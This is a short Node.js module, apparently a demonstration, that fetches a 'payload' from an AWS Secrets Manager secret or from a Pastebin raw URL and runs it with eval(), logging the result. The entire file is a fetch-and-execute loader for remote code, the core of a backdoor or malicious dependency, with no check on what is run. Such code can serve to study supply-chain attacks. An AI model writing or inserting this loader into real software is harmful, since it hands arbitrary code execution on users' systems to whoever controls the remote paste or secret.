// TODO: Make this a real dependency once we have a good narrative.
const AWS = require('aws-sdk')
const axios = require('axios')

const secretsManagerSecretArn = process.env.SECRETS_MANAGER_SECRET_ARN
const pastebinId = process.env.PASTEBIN_ID

module.exports = async () => {
  let payload

  try {
    if (secretsManagerSecretArn) {
      console.log(`Retrieving the payload from a secret in the AWS Secrets Manager: ${secretsManagerSecretArn}`)

      const secretsManager = new AWS.SecretsManager()

      payload = await new Promise((resolve, reject) => {
        secretsManager.getSecretValue({
          SecretId: secretsManagerSecretArn
        }, (err, data) => {
          if (err) {
            reject(err)
          } else {
            resolve(JSON.parse(data.SecretString).payload)
          }
        })
      })
    } else if (pastebinId) {
      console.log(`Retrieving the payload from Pastebin ID: ${pastebinId}`)

      const res = await axios.get(`https://pastebin.com/raw/${pastebinId}`, {
        timeout: 1000
      })

      payload = res.data
    }

    if (!payload) {
      console.error('Payload not found.')
      return
    }

    console.log(`Payload to execute: ${payload}`)

    /*
    Evaluate the payload and log the result.
    If it takes longer than 2 seconds, timeout and indicate that in the log.
    */
    console.log(
      await Promise.race([
        eval(payload),
        new Promise(resolve => {
          setTimeout(() => resolve('eval() timed out.'), 2000)
        })
      ])
    )
  } catch (err) {
    console.error(err)
  }
}
